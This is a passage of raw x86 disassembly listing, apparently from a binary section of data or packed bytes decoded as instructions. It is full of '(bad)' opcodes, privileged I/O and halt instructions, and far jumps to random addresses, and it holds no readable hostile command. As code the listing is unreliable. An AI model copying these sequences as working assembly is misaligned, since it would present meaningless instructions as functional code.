  4018f6:	mov    WORD PTR [esi-0x2],es
  4018f9:	pop    ecx
  4018fa:	pop    ebx
  4018fb:	icebp  
  4018fc:	or     ebx,ecx
  4018fe:	and    DWORD PTR ds:0x6de570f1,edi
  401904:	or     al,0x74
  401906:	add    BYTE PTR [ebx+0x7],ch
  401909:	adc    eax,0x128438d4
  40190e:	or     DWORD PTR [ecx],ebx
  401910:	out    0xaf,al
  401912:	xchg   esp,eax
  401913:	std    
  401914:	sub    esp,ebp
  401916:	push   edx
  401917:	out    0x2d,al
  401919:	xchg   edx,eax
  40191a:	xor    bh,BYTE PTR [eax]
  40191c:	jmp    0x8323:0x2eea2cc3
  401923:	pop    edi
  401924:	rcr    BYTE PTR [eax+0x7e],0xcf
  401928:	pop    eax
  401929:	inc    ebp
  40192b:	push   ebp
  40192c:	imul   eax,DWORD PTR [ebx+0x67],0xe7f1e798
  401933:	js     0x401905
  401935:	mov    ebp,0x592d5960
  40193a:	xor    dh,BYTE PTR [ebx+0xa0af929]
  401940:	or     ch,cl
  401942:	push   edi
  401943:	add    eax,0xe87d0398
  401948:	cli    
  401949:	xor    eax,DWORD PTR [eax+0x47]
  40194c:	leave  
  40194d:	(bad)  [ecx]
  40194f:	lock dec edx
  401951:	xor    ebp,DWORD PTR [esi-0x6a]
  401954:	loopne 0x40190a
  401956:	and    BYTE PTR [ebx],dl
  401958:	std    
  401959:	mov    ebx,edi
  40195b:	dec    edi
  40195c:	and    edx,eax
  40195e:	jg     0x401930
  401960:	repz fistp QWORD PTR [ebp-0x3d]
  401964:	int    0xe2
  401966:	mov    bh,0x20
  401968:	daa    
  401969:	mov    edi,0xd9766e93
  40196e:	pop    ebx
  40196f:	icebp  
  401970:	mov    bh,0xc4
  401972:	cld    
  401973:	data16 loop 0x401901
  401976:	lods   eax,DWORD PTR ds:[esi]
  401977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401978:	in     eax,dx
  401979:	adc    cl,BYTE PTR [esi-0x652977e]
  40197f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401980:	adc    bh,BYTE PTR [ebx]
  401982:	and    eax,edi
  401984:	(bad)  
  401985:	mov    es,WORD PTR [ebp+ebx*8+0x511cb737]
  40198c:	dec    ecx
  40198d:	lock mov bl,0x54
  401990:	or     al,0x75
  401992:	scas   eax,DWORD PTR es:[edi]
  401993:	cs mov bh,0xa9
  401996:	vpunpcklbw xmm5,xmm5,XMMWORD PTR [edx+0x0]
  40199b:	sbb    bl,bl
  40199d:	jl     0x40198b
  40199f:	sub    eax,0x298e47dc
  4019a4:	cmp    esp,DWORD PTR [ecx-0x62503d3c]
  4019aa:	mov    WORD PTR [ecx+0x58],fs
  4019ad:	mov    bh,0xcd
  4019af:	dec    esp
  4019b0:	push   eax
  4019b1:	fild   WORD PTR [ebx+eiz*4]
  4019b4:	sbb    edi,DWORD PTR [esi]
  4019b6:	sar    BYTE PTR [bx+di-0x3a0a],0x67
  4019bc:	jp     0x401991
  4019be:	sar    DWORD PTR [eax-0x53678ce1],1
  4019c4:	stc    
  4019c5:	shr    DWORD PTR [ebp-0x215e07ce],0x73
  4019cc:	mov    dl,0x83
  4019ce:	ins    BYTE PTR es:[edi],dx
  4019cf:	lods   eax,DWORD PTR ds:[esi]
  4019d0:	push   cs
  4019d1:	shl    BYTE PTR [esp+ebx*2],0x12
  4019d5:	fadd   QWORD PTR [esi]
  4019d7:	in     eax,dx
  4019d8:	call   0x5ecb:0x3122fa28
  4019df:	ins    DWORD PTR es:[edi],dx
  4019e0:	mov    cl,0x82
  4019e2:	or     BYTE PTR [ebx+0x332cad8b],cl
  4019e8:	fist   DWORD PTR [edx+0x44a7ad11]
  4019ee:	mov    esp,0x576723e9
  4019f3:	xlat   BYTE PTR ds:[ebx]
  4019f4:	mov    DWORD PTR ss:[edi],esi
  4019f7:	ins    BYTE PTR es:[edi],dx
  4019f8:	fistp  DWORD PTR ds:0x51de02b9
  4019fe:	adc    eax,0xa677980d
  401a03:	hlt    
  401a04:	daa    
  401a05:	dec    eax
  401a06:	nop
  401a07:	aad    0x24
  401a09:	inc    ebx
  401a0a:	jg     0x401a77
  401a0c:	ja     0x401a22
  401a0e:	adc    ebp,edx
  401a10:	fldcw  WORD PTR ds:0x83aed932
  401a16:	xor    eax,0xba0f81a9
  401a1b:	stc    
  401a1c:	les    ebp,FWORD PTR [esp+ecx*4+0x5c]
  401a20:	idiv   BYTE PTR [ecx+ebp*8+0x22cd6504]
  401a27:	mov    al,0xe1
  401a29:	push   0x111d53ac
  401a2e:	push   ds
  401a2f:	adc    eax,0xc05714d6
  401a34:	or     eax,esp
  401a36:	inc    esi
  401a37:	daa    
  401a38:	ror    BYTE PTR [edi],cl
  401a3a:	jmp    FWORD PTR [eax-0x531c1898]
  401a40:	pop    ss
  401a41:	out    dx,al
  401a42:	add    eax,0x68c2cb2e
  401a47:	daa    
  401a48:	out    dx,eax
  401a49:	inc    esp
  401a4a:	inc    edx
  401a4b:	jae    0x401a9e
  401a4d:	bound  edx,QWORD PTR [eax]
  401a4f:	stos   DWORD PTR es:[edi],eax
  401a50:	daa    
  401a51:	arpl   dx,cx
  401a53:	sub    BYTE PTR [esi+0x4380c353],ch
  401a59:	sahf   
  401a5a:	jmp    0x401aac
  401a5c:	test   eax,0x2e8e3fe6
  401a61:	scas   al,BYTE PTR es:[edi]
  401a62:	ror    BYTE PTR [eax+0x3922acad],cl
  401a68:	stos   DWORD PTR es:[edi],eax
  401a69:	repz inc eax
  401a6b:	mov    ?,WORD PTR [ecx-0x3]
  401a6e:	xchg   BYTE PTR [eax],ch
  401a70:	scas   al,BYTE PTR es:[edi]
  401a71:	dec    edi
  401a72:	popa   
  401a73:	inc    ebp
  401a74:	loop   0x401ae9
  401a76:	aad    0xe4
  401a78:	lock sbb eax,0x7bfb255c
  401a7e:	rcr    BYTE PTR [edx-0xa],0xa1
  401a82:	mov    eax,DWORD PTR [edi]
  401a84:	loopne 0x401a7c
  401a86:	jns    0x401a93
  401a88:	pop    edi
  401a89:	(bad)  
  401a8a:	addr16 aam 0x9
  401a8d:	sbb    ah,BYTE PTR [ecx-0x28]
  401a90:	loope  0x401b03
  401a92:	inc    esp
  401a93:	sbb    ah,BYTE PTR [ecx-0x2e]
  401a96:	xchg   ecx,eax
  401a97:	pop    ss
  401a98:	add    dl,BYTE PTR [ecx]
  401a9a:	mov    ds:0x9f82c39e,al
  401a9f:	aaa    
  401aa0:	aam    0x87
  401aa2:	cli    
  401aa3:	out    dx,al
  401aa4:	sub    ah,BYTE PTR [edi]
  401aa6:	mov    ds:0xbb306d04,eax
  401aab:	sbb    bh,ch
  401aad:	std    
  401aae:	pop    ds
  401aaf:	mov    ecx,0x391dac41
  401ab4:	mov    ds:0x69714c09,eax
  401ab9:	aad    0x23
  401abb:	into   
  401abc:	(bad)  
  401abd:	neg    BYTE PTR [esp+ecx*2]
  401ac0:	imul   ebp,DWORD PTR [eax],0x3e
  401ac3:	mov    ecx,ebp
  401ac5:	jb     0x401acf
  401ac7:	jne    0x401b42
  401ac9:	and    DWORD PTR [ebx],edi
  401acb:	hlt    
  401acc:	push   ebp
  401acd:	fbld   TBYTE PTR [edx+0x69f02541]
  401ad3:	or     ah,BYTE PTR [edi+0x25]
  401ad6:	outs   dx,DWORD PTR ds:[esi]
  401ad7:	mov    dl,0x6d
  401ad9:	pop    ss
  401ada:	dec    esp
  401adb:	xor    BYTE PTR [ebp+0x41ce701e],bl
  401ae1:	test   DWORD PTR [edx+eax*4],0x8444520e
  401ae8:	repnz mov eax,0x9066eb16
  401aee:	mov    edx,0xa5e4453e
  401af3:	or     eax,0xb8ab2e6d
  401af8:	arpl   bx,sp
  401afa:	outs   dx,BYTE PTR ds:[esi]
  401afb:	repnz out dx,eax
  401afd:	push   0x122e0433
  401b02:	or     BYTE PTR [edx+0x2dd6b1a],bh
  401b08:	test   eax,0xd11df7b2
  401b0d:	(bad)  
  401b0f:	pop    esi
  401b10:	mov    ds:0x20e1b62,eax
  401b15:	xor    eax,DWORD PTR [ebp+0x53]
  401b18:	dec    ebp
  401b19:	popf   
  401b1a:	les    ebp,FWORD PTR [ecx]
  401b1c:	out    dx,eax
  401b1d:	int3   
  401b1e:	loopne 0x401b21
  401b20:	xchg   ebx,eax
  401b21:	scas   eax,DWORD PTR es:[edi]
  401b22:	jp     0x401ac6
  401b24:	cmp    al,0xff
  401b26:	mov    esi,0x76fab15
  401b2b:	lds    esi,FWORD PTR [ebp-0x5e]
  401b2e:	in     al,0x86
  401b30:	mov    bl,0xed
  401b32:	call   0xe3a93a18
  401b37:	scas   al,BYTE PTR es:[edi]
  401b38:	mov    ah,0x84
  401b3a:	stc    
  401b3b:	dec    eax
  401b3c:	mov    edx,0xf786255f
  401b41:	xor    cl,cl
  401b43:	(bad)  
  401b44:	xor    edx,esi
  401b46:	shl    BYTE PTR [ebx+esi*1],0x28
  401b4a:	xchg   DWORD PTR [eax+0x4981794],esi
  401b50:	mov    bh,al
  401b52:	mov    dh,0xdd
  401b54:	jae    0x401b67
  401b56:	mov    ecx,0x5df41519
  401b5b:	cmp    eax,0x4ef34f07
  401b60:	ss adc eax,0xa7bcef72
  401b66:	mov    ds:0xf47c1c67,al
  401b6b:	jg     0x401b48
  401b6d:	les    sp,DWORD PTR [ebx-0x16739e6c]
  401b74:	aad    0x1f
  401b76:	push   eax
  401b77:	imul   eax,DWORD PTR [ebx],0x90b54c0b
  401b7d:	in     al,0x77
  401b7f:	cmp    edx,edx
  401b81:	xor    esi,edi
  401b83:	test   al,0xe
  401b85:	popa   
  401b86:	dec    ebp
  401b87:	(bad)  
  401b88:	jno    0x401bfc
  401b8a:	jge    0x401bbe
  401b8c:	sub    bh,bh
  401b8e:	and    DWORD PTR [ebp-0x3b],0x6d9eac41
  401b95:	jmp    0x401ba7
  401b97:	fcomp  DWORD PTR cs:0xfa92c03
  401b9e:	mov    ds:0x7e13b27,al
  401ba3:	jecxz  0x401c0c
  401ba5:	sbb    dh,BYTE PTR [eax+0x3e0b2a87]
  401bab:	jne    0x401bdb
  401bad:	call   FWORD PTR [esi+0x63]
  401bb0:	pop    edi
  401bb1:	jns    0x401b60
  401bb3:	int3   
  401bb4:	mov    cl,al
  401bb6:	pop    ebx
  401bb7:	jecxz  0x401bd1
  401bb9:	pushf  
  401bba:	push   ss
  401bbb:	lahf   
  401bbc:	lock xchg eax,edx
  401bbf:	or     eax,0xf227fcc5
  401bc4:	(bad)  
  401bc5:	imul   eax,ebx,0xffffffa6
  401bc8:	test   DWORD PTR [edi+0x5c],0xb00eef6
  401bcf:	in     al,dx
  401bd0:	(bad)  
  401bd1:	fcmovnu st,st(0)
  401bd3:	int3   
  401bd4:	jo     0x401c09
  401bd6:	or     eax,0xadcf8f29
  401bdb:	xor    eax,0x400a47fa
  401be0:	cli    
  401be1:	std    
  401be2:	sbb    al,0x30
  401be4:	inc    eax
  401be5:	xchg   edi,eax
  401be6:	jl     0x401bd3
  401be8:	jne    0x401c4e
  401bea:	test   eax,0x64b46371
  401bef:	aam    0xd8
  401bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bf2:	lock push edx
  401bf4:	fsubr  DWORD PTR [edx]
  401bf6:	stc    
  401bf7:	or     ecx,DWORD PTR [eax-0x33]
  401bfa:	adc    eax,0x6e088c07
  401bff:	stos   BYTE PTR es:[edi],al
  401c00:	stc    
  401c01:	xlat   BYTE PTR ds:[ebx]
  401c02:	xchg   ebx,eax
  401c03:	in     al,0x21
  401c05:	loope  0x401bc8
  401c07:	mov    ds:0x92e17d6f,al
  401c0c:	aad    0x9d
  401c0e:	das    
  401c0f:	mov    BYTE PTR [eax+0x2e],bl
  401c12:	xor    eax,0x3d5b6084
  401c17:	je     0x401c22
  401c19:	test   eax,0x84806eb3
  401c1e:	xor    al,0xf0
  401c20:	cmp    edx,DWORD PTR [edi]
  401c22:	add    esp,ecx
  401c24:	jmp    0x9921:0x37cc9d25
  401c2b:	cmp    DWORD PTR [esi-0xf],edx
  401c2e:	mov    eax,ss:0x83c88755
  401c34:	out    0x3f,al
  401c36:	jl     0x401ca0
  401c38:	cmp    DWORD PTR [esi],ebp
  401c3a:	jle    0x401c70
  401c3c:	xchg   edi,eax
  401c3d:	test   DWORD PTR [eax+0x60],ebx
  401c40:	loope  0x401cbc
  401c42:	mov    ds:0xbd81216f,eax
  401c47:	(bad)  
  401c49:	cli    
  401c4a:	mov    ebx,0x4b0fbfde
  401c4f:	mov    ch,0x5c
  401c51:	mov    WORD PTR [ebx+eiz*4-0x56],fs
  401c55:	pop    esp
  401c56:	sbb    BYTE PTR [esi-0x78bf5156],ch
  401c5c:	xor    dl,BYTE PTR [ebx+ebp*2-0x4e059f62]
  401c63:	push   esp
  401c64:	clc    
  401c65:	inc    esp
  401c66:	mov    ch,0x22
  401c68:	jns    0x401c6f
  401c6a:	std    
  401c6b:	(bad)  
  401c6c:	jle    0x401c40
  401c6e:	bound  ebx,QWORD PTR [edx+0x3a87d173]
  401c74:	mov    al,ds:0xa5cf788e
  401c79:	jo     0x401cb9
  401c7b:	and    BYTE PTR [eax-0x58],ch
  401c7e:	xchg   BYTE PTR [edx+eax*2],bl
  401c81:	call   0x70ebb88c
  401c86:	sbb    esi,ebp
  401c88:	stos   BYTE PTR es:[edi],al
  401c89:	rol    DWORD PTR [edi+edx*2+0x4c0e79e1],0x24
  401c91:	int    0x46
  401c93:	sbb    cl,BYTE PTR [ebx-0x7fdf1ad3]
  401c99:	sbb    eax,0x4251b526
  401c9e:	test   eax,0x5acf337e
  401ca3:	retf   0xe1b9
  401ca6:	push   ecx
  401ca7:	dec    BYTE PTR [ebp-0x5]
  401caa:	push   esp
  401cab:	pop    eax
  401cac:	add    eax,0xf837332
  401cb1:	dec    edi
  401cb2:	(bad)  
  401cb3:	xlat   BYTE PTR ds:[ebx]
  401cb4:	loopne 0x401cdd
  401cb6:	shl    ecx,0x70
  401cb9:	js     0x401d37
  401cbb:	inc    ebp
  401cbc:	scas   eax,DWORD PTR es:[edi]
  401cbd:	daa    
  401cbe:	ins    DWORD PTR es:[edi],dx
  401cbf:	fnstenv ds:[eax+ebp*4]
  401cc3:	test   al,0xf6
  401cc5:	ins    BYTE PTR es:[edi],dx
  401cc6:	inc    edx
  401cc7:	xchg   esp,eax
  401cc8:	icebp  
  401cc9:	out    0x39,al
  401ccb:	xchg   esi,eax
  401ccc:	xchg   edx,eax
  401ccd:	repnz or ch,dl
  401cd0:	ds in  al,0xbb
  401cd3:	fs cwde 
  401cd5:	mov    WORD PTR [ebx+0x2acfb675],?
  401cdb:	mov    ds:0xbb059214,eax
  401ce0:	(bad)
  401ce4:	and    DWORD PTR [edi+0x2c2469a0],0x57577442
  401cee:	iret   
  401cef:	icebp  
  401cf0:	add    al,0xbb
  401cf2:	retf   
  401cf3:	mov    bh,0x71
  401cf5:	out    dx,eax
  401cf6:	jb     0x401d74
  401cf8:	xchg   esp,eax
  401cf9:	dec    eax
  401cfa:	mov    dl,0x30
  401cfc:	xchg   DWORD PTR [edx+0x71bd92d4],ebp
  401d02:	adc    al,0xa1
  401d04:	jl     0x401cf8
  401d06:	add    al,0x8c
  401d08:	pop    edi
  401d09:	mov    eax,ds:0x43f72129
  401d0e:	loope  0x401d6b
  401d10:	dec    esi
  401d11:	inc    ebp
  401d12:	sbb    ebx,ebp
  401d14:	mov    esp,0x6d81724b
  401d19:	stc    
  401d1a:	pop    es
  401d1b:	mov    edx,0x4312374a
  401d20:	out    0xd2,al
  401d22:	mov    bh,BYTE PTR [edx]
  401d24:	inc    edx
  401d25:	or     al,0xfc
  401d27:	std    
  401d28:	sub    al,0x14
  401d2a:	rol    BYTE PTR [edx],1
  401d2c:	into   
  401d2d:	jmp    0x401d43
  401d2f:	push   esp
  401d30:	mov    ecx,0x727a77da
  401d35:	xchg   esi,eax
  401d36:	mov    al,0x67
  401d38:	(bad)  
  401d39:	fcomip st,st(0)
  401d3b:	(bad)  
  401d3d:	push   ebx
  401d3e:	add    BYTE PTR [ebp-0x11],al
  401d41:	or     DWORD PTR [eax-0x14b82fd0],0x6a2188c
  401d4b:	jp     0x401d04
  401d4d:	cmp    al,0x6b
  401d4f:	out    0x96,al
  401d51:	mov    ebx,0x6d2213a5
  401d56:	xlat   BYTE PTR ds:[ebx]
  401d57:	pop    ecx
  401d58:	(bad)  
  401d59:	pop    esi
  401d5a:	lods   al,BYTE PTR ds:[esi]
  401d5b:	cdq    
  401d5c:	test   eax,0xc633a674
  401d61:	sub    DWORD PTR [esi+0x4b],esi
  401d64:	push   eax
  401d65:	data16 jmp 0x401de0
  401d68:	mov    DWORD PTR [edi-0xcd889e4],ebx
  401d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d6f:	inc    esi
  401d70:	mov    BYTE PTR [eax+0x2aecb572],0x3
  401d77:	ret    
  401d78:	push   esp
  401d79:	cli    
  401d7a:	push   edi
  401d7b:	mov    ebp,0xfeba41af
  401d80:	push   ebp
  401d81:	push   es
  401d82:	popa   
  401d83:	je     0x401d64
  401d85:	fdiv   DWORD PTR ds:0x2661c68f
  401d8b:	jp     0x401d60
  401d8d:	mov    al,BYTE PTR [ecx+0xb]
  401d90:	inc    edx
  401d91:	or     dl,BYTE PTR [eax+0x78]
  401d94:	dec    esp
  401d95:	xchg   esi,eax
  401d96:	mov    edx,ds
  401d98:	ror    DWORD PTR [ecx+0x51],1
  401d9b:	call   0xe09d:0x270337c0
  401da2:	ja     0x401d3b
  401da4:	out    0xcc,al
  401da6:	cmp    esi,0x75
  401da9:	and    dh,BYTE PTR [edx]
  401dab:	adc    esp,DWORD PTR [ebp-0x23ef231b]
  401db1:	jg     0x401dd1
  401db3:	ror    DWORD PTR [eax+0x2875cc01],0xc7
  401dba:	cmp    BYTE PTR [ecx+0xa7bb2ed],cl
  401dc0:	(bad)  [ebp-0x3a]
  401dc3:	(bad)  
  401dc4:	mov    bl,0xc7
  401dc6:	test   al,0x23
  401dc8:	enter  0xfb4d,0x53
  401dcc:	xchg   ebp,eax
  401dcd:	lods   eax,DWORD PTR ds:[esi]
  401dce:	out    dx,eax
  401dcf:	(bad)  
  401dd0:	xchg   edx,eax
  401dd1:	sub    bh,cl
  401dd3:	repnz in al,0x3f
  401dd6:	repz out dx,eax
  401dd8:	cmp    al,0xd4
  401dda:	push   eax
  401ddb:	rcl    BYTE PTR [ecx-0x1f],0x5b
  401ddf:	in     al,dx
  401de0:	(bad)  
  401de1:	lods   eax,DWORD PTR ds:[esi]
  401de2:	mov    esp,0x78bae582
  401de7:	loope  0x401e3a
  401de9:	sbb    ebp,DWORD PTR [edx]
  401deb:	mov    eax,ds:0x29cf5ea6
  401df0:	push   cs
  401df1:	mov    ch,0x7
  401df3:	lock sahf 
  401df5:	fsubr  DWORD PTR [esi+0x256aded8]
  401dfb:	jbe    0x401dc2
  401dfd:	cs mov ebx,0xf0b5e015
  401e03:	lds    edx,FWORD PTR [edi+0x9]
  401e06:	ja     0x401de9
  401e08:	test   eax,0xaef62483
  401e0d:	fstp   DWORD PTR [edi+0x79185be3]
  401e13:	mov    ah,0x64
  401e15:	pop    edi
  401e16:	cmc    
  401e17:	mov    ds:0x604a5b03,al
  401e1c:	sub    al,0x67
  401e1e:	inc    eax
  401e1f:	lock xor al,0x77
  401e22:	xchg   ebp,eax
  401e23:	dec    edi
  401e24:	mov    bl,0x4b
  401e26:	retf   
  401e27:	out    0x97,eax
  401e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e2a:	sahf   
  401e2b:	sbb    bh,BYTE PTR [esi-0x3dbae15]
  401e31:	dec    eax
  401e32:	scas   al,BYTE PTR es:[edi]
  401e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e34:	dec    eax
  401e35:	mov    esi,0xd5154ce
  401e3a:	cmp    DWORD PTR [edx+0x3268b6ad],ebx
  401e40:	rcl    DWORD PTR [edi-0x24fb32bb],1
  401e46:	or     ah,BYTE PTR [eax]
  401e48:	adc    DWORD PTR [ebx],esp
  401e4a:	leave  
  401e4b:	aaa    
  401e4c:	rol    BYTE PTR ds:0x32a476ff,0xae
  401e53:	or     BYTE PTR [ecx-0x4b66ef3b],ah
  401e59:	mov    edi,0x60efb19a
  401e5e:	push   ebp
  401e5f:	leave  
  401e60:	dec    ecx
  401e61:	aam    0x40
  401e63:	add    BYTE PTR [edi],bl
  401e65:	mov    WORD PTR [edi],?
  401e67:	outs   dx,BYTE PTR ds:[esi]
  401e68:	das    
  401e69:	inc    edx
  401e6a:	sbb    edi,ebx
  401e6c:	in     al,dx
  401e6d:	bound  edx,QWORD PTR [eax-0x31]
  401e70:	popa   
  401e71:	cdq    
  401e72:	sub    BYTE PTR [ecx-0xf],bl
  401e75:	jno    0x401eae
  401e77:	mov    eax,ds:0xba214640
  401e7c:	cmp    eax,0x879bd11e
  401e81:	jecxz  0x401edd
  401e83:	scas   eax,DWORD PTR es:[edi]
  401e84:	xchg   esp,eax
  401e85:	add    cl,BYTE PTR [esi+esi*2]
  401e88:	and    ebx,eax
  401e8a:	sbb    dh,BYTE PTR [edx+0x67af35ee]
  401e90:	jbe    0x401f11
  401e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e93:	icebp  
  401e94:	ss xchg esi,eax
  401e96:	push   ebp
  401e97:	sahf   
  401e98:	adc    al,0xab
  401e9a:	jmp    0x1457:0xeaf03090
  401ea1:	add    DWORD PTR [ecx+ecx*4+0x5eb9a111],esp
  401ea8:	mov    ch,0x3a
  401eaa:	push   es
  401eab:	sbb    BYTE PTR [ecx-0x49bb6ff9],cl
  401eb1:	int3   
  401eb2:	mov    ds:0x372aebce,al
  401eb7:	add    al,0x58
  401eb9:	sub    esp,0x347d57f1
  401ebf:	mov    bh,0x94
  401ec1:	rol    BYTE PTR [esi],1
  401ec3:	dec    eax
  401ec4:	stos   BYTE PTR es:[edi],al
  401ec5:	test   al,0x45
  401ec7:	sbb    eax,0x97a39b68
  401ecc:	and    DWORD PTR [edx],0xc0292f55
  401ed2:	cmovp  eax,DWORD PTR [ecx+0x5c874c21]
  401ed9:	pop    esi
  401eda:	(bad)  
  401edb:	fstp   TBYTE PTR [esi-0x2720790f]
  401ee1:	dec    ebx
  401ee2:	jo     0x401e9b
  401ee4:	cmp    BYTE PTR [edi-0x5456a18a],cl
  401eea:	xchg   ecx,eax
  401eeb:	or     BYTE PTR [eax+0x477fe4d4],al
  401ef1:	adc    eax,0x9d9de4ec
  401ef6:	addr16 and ch,dl
  401ef9:	enter  0xb730,0x67
  401efd:	jae    0x401ecf
  401eff:	mov    esp,0xfa15df84
  401f04:	push   edx
  401f05:	(bad)  
  401f06:	les    edi,FWORD PTR [esi+0x59]
  401f09:	inc    edx
  401f0a:	pusha  
  401f0b:	sti    
  401f0c:	sub    edi,ecx
  401f0e:	mov    edi,0x1ffb3d48
  401f13:	(bad)  
  401f14:	push   0x43
  401f16:	das    
  401f17:	jno    0x401eaa
  401f19:	jns    0x401f51
  401f1b:	call   0x69b8:0xcde8a46d
  401f22:	pop    ebx
  401f23:	int3   
  401f24:	and    ch,BYTE PTR [edx]
  401f26:	mov    WORD PTR [ebp-0x2ff9fa0c],ds
  401f2c:	mov    ch,0x7c
  401f2e:	cmp    esi,DWORD PTR [ecx+0x2d3f9d3]
  401f34:	xchg   ebx,eax
  401f35:	add    al,0xff
  401f37:	or     dh,BYTE PTR [ebx+esi*1]
  401f3a:	fwait
  401f3b:	adc    eax,esi
  401f3d:	hlt    
  401f3e:	xchg   ebx,eax
  401f3f:	mov    esp,0xf5d65df9
  401f44:	dec    esi
  401f45:	scas   al,BYTE PTR es:[edi]
  401f46:	pop    esi
  401f47:	add    ch,al
  401f49:	mov    ecx,0xce81edc8
  401f4e:	add    BYTE PTR [ebx-0x2e],bh
  401f51:	push   edx
  401f52:	aad    0x8d
  401f54:	iret   
  401f55:	cdq    
  401f56:	push   es
  401f57:	nop
  401f58:	dec    esp
  401f59:	jge    0x401f7a
  401f5b:	xchg   BYTE PTR [eax+0x1a],dh
  401f5e:	or     BYTE PTR [ecx],al
  401f60:	sbb    eax,0xfb40aaed
  401f65:	push   cs
  401f66:	idiv   ebx
  401f68:	cmc    
  401f69:	jge    0x401f45
  401f6b:	retf   0xe717
  401f6e:	daa    
  401f6f:	push   eax
  401f70:	sub    eax,0xa72cf967
  401f75:	push   esp
  401f76:	cmc    
  401f77:	push   0x2f22419c
  401f7c:	sbb    al,0x68
  401f7e:	inc    esi
  401f7f:	or     ah,BYTE PTR [esi-0x27db7c40]
  401f85:	std    
  401f86:	xor    al,0x94
  401f88:	(bad)  
  401f89:	jns    0x401f8a
  401f8b:	lahf   
  401f8c:	call   0xdf2799f0
  401f91:	out    0x35,al
  401f93:	cmp    DWORD PTR [ecx-0x7a],ecx
  401f96:	rcl    BYTE PTR [edi],1
  401f98:	(bad)  
  401f99:	push   esi
  401f9a:	sub    eax,0xcc1dc622
  401f9f:	dec    edi
  401fa0:	mov    BYTE PTR [ebp+0x50bcb6d0],al
  401fa6:	call   0xe1ef501b
  401fab:	sbb    DWORD PTR ds:0x7fe52449,esp
  401fb1:	adc    eax,0x9ac910ed
  401fb6:	and    DWORD PTR [edx-0x37],esp
  401fb9:	stos   DWORD PTR es:[edi],eax
  401fba:	call   0xf9e095de
  401fbf:	in     eax,0xb
  401fc1:	xchg   esp,eax
  401fc2:	or     bh,bh
  401fc4:	inc    ecx
  401fc5:	int    0xb
  401fc7:	mov    edx,0xd8e2f2f6
  401fcc:	sbb    BYTE PTR [esi+0x3c328555],cl
  401fd2:	xchg   edx,eax
  401fd3:	mov    al,ds:0x3f11cfa
  401fd8:	dec    esi
  401fd9:	sub    eax,0xee4780b
  401fde:	inc    esp
  401fdf:	fldenv [esi-0x2]
  401fe2:	test   eax,0x4b57e304
  401fe7:	shl    BYTE PTR [edi+0x71],0xbd
  401feb:	xchg   ecx,eax
  401fec:	std    
  401fed:	inc    eax
  401fee:	adc    al,0xa1
  401ff0:	mov    edi,0xb5dc6f90
  401ff5:	sub    al,0x90
  401ff7:	and    DWORD PTR [edx],ebp
  401ff9:	cwde   
  401ffa:	sub    ecx,DWORD PTR [edi-0x1848e34b]
  402000:	jnp    0x401f8f
  402002:	jns    0x40205b
  402004:	loopne 0x402060
  402006:	test   eax,0x25a7eaaa
  40200b:	jmp    0x402058
  40200d:	jg     0x401fb2
  40200f:	(bad)  {k6}
  402014:	in     eax,0xe
  402016:	int3   
  402017:	inc    ebp
  402018:	jmp    0x8c04210c
  40201d:	hlt    
  40201e:	std    
  40201f:	xchg   BYTE PTR [edi],al
  402021:	ret    
  402022:	ins    BYTE PTR es:[edi],dx
  402023:	mov    edi,0x38b32a39
  402028:	xor    BYTE PTR [ecx],dl
  40202a:	mov    al,ds:0xeed50887
  40202f:	jp     0x402096
  402031:	pop    edi
  402032:	pop    ebp
  402033:	or     ch,0xfb
  402036:	and    ebp,DWORD PTR [eax+0x63]
  402039:	sub    DWORD PTR [ebx],ebp
  40203b:	aam    0x21
  40203d:	sbb    eax,0xacf9b125
  402042:	stos   BYTE PTR es:[edi],al
  402043:	aaa    
  402044:	sbb    DWORD PTR [ecx-0x46],ebx
  402047:	cmc    
  402048:	out    0xcf,al
  40204a:	xchg   ecx,eax
  40204b:	xor    eax,0xeb27d02b
  402050:	push   ebx
  402051:	fcmovu st,st(0)
  402053:	mov    ds:0x3469b39d,eax
  402058:	(bad)  
  402059:	mov    edi,0x848a16d4
  40205e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40205f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402060:	push   esp
  402061:	fsubr  DWORD PTR [ebx]
  402063:	push   0x4a9c566
  402068:	cmp    al,0x29
  40206a:	aam    0x24
  40206c:	ret    
  40206d:	or     bh,bl
  40206f:	ss inc esi
  402071:	xchg   esp,eax
  402072:	push   ecx
  402073:	or     BYTE PTR [edx+0x7e14008a],0x2c
  40207a:	xor    DWORD PTR [esi+0xb2818b5],edi
  402080:	in     eax,0x4d
  402082:	xchg   esp,eax
  402083:	js     0x402073
  402085:	dec    eax
  402086:	pusha  
  402087:	dec    eax
  402088:	mov    ds:0x88119229,eax
  40208d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40208e:	xor    esi,DWORD PTR [esi+0x4c]
  402091:	dec    ebp
  402092:	fdivr  QWORD PTR [eax-0x3123b6e1]
  402098:	call   FWORD PTR [edx-0x7b]
  40209b:	sti    
  40209c:	in     al,dx
  40209d:	jp     0x402035
  40209f:	popf   
  4020a0:	out    0x96,al
  4020a2:	icebp  
  4020a3:	(bad)  [eax]
  4020a5:	pusha  
  4020a6:	or     BYTE PTR [esi],bh
  4020a8:	jecxz  0x402106
  4020aa:	mov    eax,0x483bb1a0
  4020af:	pop    edx
  4020b0:	dec    ecx
  4020b1:	inc    edx
  4020b2:	adc    edi,DWORD PTR [eax+esi*2]
  4020b5:	push   cs
  4020b6:	adc    edi,esp
  4020b8:	scas   al,BYTE PTR es:[edi]
  4020b9:	mov    BYTE PTR [ebx-0x41],bh
  4020bc:	fdiv   QWORD PTR [ebp-0x5d2c08b8]
  4020c2:	inc    edx
  4020c3:	xchg   esp,eax
  4020c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020c5:	sti    
  4020c6:	jmp    0xa4d1:0xe7ff20c3
  4020cd:	mov    ds:0x3a88daae,eax
  4020d2:	(bad)  
  4020d3:	and    DWORD PTR ds:0xc4bac2da,ebp
  4020d9:	(bad)  
  4020da:	mov    ds:0x64ad1e02,eax
  4020df:	mov    ecx,0x9463157
